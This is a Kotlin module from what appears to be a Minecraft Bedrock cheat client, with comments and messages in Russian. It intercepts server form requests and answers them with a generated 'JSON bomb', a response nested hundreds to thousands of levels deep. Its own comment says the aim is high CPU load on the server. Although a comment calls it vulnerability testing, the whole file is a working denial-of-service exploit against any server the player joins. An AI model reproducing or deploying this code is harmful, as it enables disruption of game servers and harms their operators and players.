package com.mucheng.mucute.client.game.module.misc

import com.mucheng.mucute.client.game.GameSession
import com.mucheng.mucute.client.game.InterceptablePacket
import com.mucheng.mucute.client.game.Module
import com.mucheng.mucute.client.game.ModuleCategory
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.cloudburstmc.protocol.bedrock.packet.ModalFormRequestPacket
import org.cloudburstmc.protocol.bedrock.packet.ModalFormResponsePacket

/**
 * Модуль для продвинутого тестирования уязвимостей сервера с использованием
 * алгоритмической JSON-атаки ("JSON-бомба"), вызывающей высокую нагрузку на CPU.
 */
class AnomalousPacketTester : Module("AnomalousPacketTester", ModuleCategory.Misc) {

    // --- Настройки ---
    private val attackDelay by intValue("Attack Delay (ms)", 200, 50..2000)
    private val jsonNestingDepth by intValue("JSON Nesting Depth", 800, 100..5000)

    override fun onEnabled() {
        super.onEnabled()
        if (isSessionCreated) session.displayClientMessage("§a[AnomalousTester] Модуль включен. Ожидание формы-триггера.")
    }

    override fun onDisabled() {
        super.onDisabled()
        if (isSessionCreated) session.displayClientMessage("§c[AnomalousTester] Модуль выключен.")
    }

    override fun beforePacketBound(interceptablePacket: InterceptablePacket) {
        if (!isEnabled) return

        val packet = interceptablePacket.packet
        if (packet is ModalFormRequestPacket) {
            interceptablePacket.intercept()
            
            session.displayClientMessage("§6[AnomalousTester] Форма перехвачена! Запускаю JSON-атаку...")

            GlobalScope.launch {
                sendDeeplyNestedFormResponse(packet.formId)
                delay(attackDelay.toLong())
                session.displayClientMessage("§a[AnomalousTester] Атака завершена. Проверяйте состояние сервера.")
            }
        }
    }

    private fun sendDeeplyNestedFormResponse(formId: Int) {
        try {
            val responsePacket = ModalFormResponsePacket()
            responsePacket.setFormId(formId)

            var maliciousJson = "\"leaf\""
            for (i in 1..jsonNestingDepth) {
                maliciousJson = "{\"key\":$maliciousJson}"
            }
            responsePacket.setFormData(maliciousJson)
            
            session.serverBound(responsePacket)
            session.displayClientMessage("§e[AnomalousTester] Отправлена JSON-бомба (глубина: $jsonNestingDepth).")
        } catch (e: Exception) {
            session.displayClientMessage("§c[AnomalousTester] Ошибка при отправке JSON-бомбы: ${e.message}")
        }
    }
}
